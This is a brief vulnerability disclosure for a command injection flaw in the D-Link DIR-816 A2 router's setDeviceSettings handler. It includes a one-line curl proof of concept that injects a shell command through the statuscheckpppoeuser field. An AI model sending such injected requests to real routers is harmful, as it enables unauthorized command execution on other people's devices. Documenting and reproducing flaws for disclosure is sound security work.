D-link dir 816 A2 DIR-816 Command injection vulnerability

1. Affected version
![image](https://github.com/xiyuanhuaigu/cve/assets/92045106/1f8c49f4-2f94-4133-a5b8-2217d752c847)

Figure 1 shows the latest firmware Ba of the router
Vulnerability details

The content obtained by the program through the statuscheckpppoeuser parameter is passed to V6, and then V6 is formatted into the stack of v34 through the sprintf function. Finally, v34 is executed through the system function. There is a command injection vulnerability.
![image](https://github.com/xiyuanhuaigu/cve/assets/92045106/7c8f3237-d134-4ee8-bb01-9e5ea2d50ef2)

In order to reproduce the vulnerability, the following steps can be followed:
Use the fat simulation firmware DIR-816_V1.10CNB04.tar.gz
Attack with the following POC attacks
curl -i -X POST http://192.168.0.1/goform/setDeviceSettings -d 'statuscheckpppoeuser=|| ls > /tmp/456'
The reproduction results are as follows:
![image](https://github.com/xiyuanhuaigu/cve/assets/92045106/20ab473f-c239-4df2-b961-039d8c85d04a)
